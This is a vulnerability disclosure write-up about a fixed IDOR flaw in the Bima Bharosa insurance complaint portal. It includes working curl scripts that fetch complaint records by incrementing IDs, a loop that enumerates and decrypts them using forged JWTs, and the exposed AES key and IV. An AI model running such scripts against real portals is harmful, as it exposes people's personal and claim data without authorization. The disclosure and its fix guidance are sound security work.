---
title: Bimabharosa IRDAI
date:
  created: 2025-08-14
  updated: 2025-09-12
---

# BimaBharosa IRDAI Vulnerability 2024

The Bima Bharosa portal (<https://bimabharosa.irdai.gov.in>) had a vulnerability in its complaint history API that allowed access to sensitive complaint details by simply incrementing the complaint ID. This exposed personal and claim information of policyholders without authentication.

Summary of the vulnerabilities:

| Sr | API | Date reported | Date fixed | Days taken | CERT-in reference number |
|----|-----|--------------|------------|------------|--------------------------|
| 1  | [GetComplainthistorydata](#1-getcomplainthistorydata) | 18 November 2024 | before 30 November 2024 | less than 12 days | 68209424 |
| 2  | [encrypted GetComplainthistorydata](#2-getcomplainthistorydata-encrypted-payload) | 30 November 2024 | 1 January 2025 | 31 days | 68209424 |

Root cause in [OWASP](https://cheatsheetseries.owasp.org/index.html) terms:

- A01 2021 Broken Access Control: CWE-284 Improper Access Control, CWE-285 Improper Authorization
- A04 2021 Insecure Design: Insecure Direct Object Reference
- A07 2021 Identification and Authentication Failures: CWE-287 Improper Authentication

<!-- more -->

### 1. GetComplainthistorydata

The API endpoint `/api/PolicyholderComplaint/GetComplainthistorydata` accepted a POST parameter `complaint_Id` and returned the full complaint history for that ID. No authentication or authorization was required. By incrementing the `complaint_Id`, an attacker could access complaint details of other users, including names, policy numbers, claim details, and remarks from insurers.

```bash title="sample_script.sh" linenums="1"
#!/bin/bash
curl 'https://bimabharosa.irdai.gov.in/api/PolicyholderComplaint/GetComplainthistorydata' -X POST \
 --data-raw 'complaint_Id=4390102'
```

<details>
<summary>Sample response</summary>
```json linenums="1"
---8<--- "docs/vuln/posts/content_bimabharosa/bimabharosa_vuln_1.json"
```
</details>

### $$ Bogus encryption

An encryption was added to API request and response but with the KEY and IV exposed in the front-end code.

```bash title="encr_decr.sh" linenums="1"
#!/bin/bash
# Hex representation of "1234567890000000", exposed in the front-end code.
KEY=3132333435363738393030303030303031323334353637383930303030303030
# Hex representation of "7061737323313233", exposed in the front-end code.
IV=37303631373337333233333133323333

decrypt() {
    echo $(echo -n "$1"| xxd -r -p | openssl enc -aes-256-cbc -d -K "$KEY" -iv "$IV" -nosalt)
}

encrypt() {
    echo $(echo -n "$1" | openssl enc -aes-256-cbc -K "$KEY" -iv "$IV" | xxd -p | tr '[:lower:]' '[:upper:]')
}

for i in "BB2D310BF97F463A42D24E39C1187650" "C5C26E3D620D69E9422744CF50A3D523" "159EF5E147F60C65ECFBF9F9E7B31794"; do
    echo "Input: $i"
    decrypted=$(decrypt "$i")
    echo "Decrypted: $decrypted"
    echo
done

for i in "[]" "null" ""; do
    echo "Input: $i"
    encrypted=$(encrypt "$i")
    echo "Encrypted: $encrypted"
    echo
done
```

### 2. GetComplainthistorydata encrypted payload

This API accepted encrypted payload and provided encrypted response, but still without authorization checks.

Further, any JWT that anyone created was accepted by the API.

The two joined tokens in the header `Authorization` are useless.

```bash title="sample_script_encrypted.sh" linenums="1"
for complaint_id in {4390200..4390249}; do
    input="{\"complaint_Id\":\"$complaint_id\"}"

    payload="$(encrypt "$input")"

    curl -X POST "https://bimabharosa.irdai.gov.in/api/PolicyholderComplaint/GetComplainthistorydata" \
    -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1bmlxdWVfbmFtZSI6Ijk5OTk5OTk5OTkiLCJuYmYiOjE3MzI5NjgzNjQsImV4cCI6MTczMjk2ODQyNCwiaWF0IjoxNzMyOTY4MzY0fQ.h8DOqtaQ-aLch-XbiSSzUIIZKmPKq2eVScY20x1yEbQ:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1bmlxdWVfbmFtZSI6Ijk5OTk5OTk5OTkiLCJuYmYiOjE3MzI5NjgzNjQsImV4cCI6MTczMjk3MTk2NCwiaWF0IjoxNzMyOTY4MzY0fQ.7ftbp4DhReEyRiXqvfu6E3st1jgqJ_u2EJUr9Rog7os" \
    -H "Cookie: portal-culture=en; $$$$$$$$" \
    --data-urlencode "EncryptUpdateData=$payload" \
    -o "bimabharosa_vuln_2_$complaint_id.json"

    decrypt "$(cat "bimabharosa_vuln_2_$complaint_id.json")" > "bimabharosa_vuln_2_decr_$complaint_id.json"
done
```

### $$ Proper fix

After I provided pseudo-code to CERT-in (and bimabharosa), a proper fix was implemented. In the JWT,
a field was added to list all the complaint IDs. Upon subsequent calls to the APi, only if
the token contained the current ID, the API would return the response.

> Token creation code:
>
> ```
> token.complaint_ids = db.get_all_complaint_ids_of_user(user_id)
> ```
>
> API code:
>
> ```
> if token.complaint_ids.contains(api_payload.complaint_id):
     > return data
> else:
     > return "Unauthorized"
>
> ```
>
> Expired tokens should be rejected!!
>
> Remove the encryption and decryption logic from the payload and response. It is useless. It is security by obscurity which is a bad idea. Data protection can be done without encryption by using JWT tokens properly.
